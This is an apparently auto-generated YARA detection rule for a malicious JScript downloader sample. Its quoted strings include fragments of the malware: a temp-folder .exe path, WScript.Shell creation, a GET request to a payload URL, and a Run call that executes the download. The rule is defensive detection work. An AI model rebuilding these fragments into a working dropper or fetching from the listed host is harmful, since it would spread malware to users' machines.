rule sig_20160328_2b931e5e498d0143b5f4c75257e42973 {
  meta:
    description = "datamaliciousorder - file 20160328_2b931e5e498d0143b5f4c75257e42973.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "483a7fa9bd23abeb199d019a3bdd89c5b371585422a05d514250879f9978b0a7"

  strings:
    $s1  = "function Ixheq() {return Wlweo[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"nEsGjllhKnDES.exe\";};" fullword ascii
    $s2  = "do {WScript[Aivkxon](Lksghcg() * 11)} while (Actohxqpgx[\"readystate\"] < 4 );" fullword ascii
    $s3  = "var Wlweo = function Kibkwochpo() {return WScript[Uhnagms](\"WScript.Shell\");}();" fullword ascii
    $s4  = "function Juimoeivy(Gcqbn, Wmiol){return Gcqbn - Wmiol;};" fullword ascii
    $s5  = "Actohxqpgx[Dondnlmel](\"GET\", \"http://www.cloudfire.pt/l3iska\", false);" fullword ascii
    $s6  = "function Dsgwtgxmxl() {return ((Vlsgnn == true) && (Vlsgnn == Snvgoudez)) ? 1 : Rglqxjzuf;};" fullword ascii
    $s7  = "function Qklqi(Ejjwkcl){Wlweo[\"Run\"](Ejjwkcl, Rglqxjzuf, Rglqxjzuf);};" fullword ascii
    $s8  = "return Juimoeivy(Hdjqzrkt, Lfcbjpox);" fullword ascii
    $s9  = "function Lksghcg(){return 22;};" fullword ascii
    $s10 = " while (Ciyreubzuh){" fullword ascii
    $s11 = "var Vlsgnn = false;" fullword ascii
    $s12 = "function Sscrpwif(Fiekpu) {var Rfavvzacoy = (1, 2, 3, 4, 5, Fiekpu); return Rfavvzacoy;};" fullword ascii
    $s13 = "var Lnzat = new this[\"Date\"]();" fullword ascii
    $s14 = "Vlsgnn = true; " fullword ascii
    $s15 = "function Vhxfz(){return Vfvchhzng;};" fullword ascii
    $s16 = "function Zuqartsvmu()" fullword ascii
    $s17 = "Snvgoudez = true; " fullword ascii
    $s18 = "function Mtvce(){return Uhnagms;};" fullword ascii
    $s19 = "var Snvgoudez = false;" fullword ascii
    $s20 = "var Ldoqfn = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}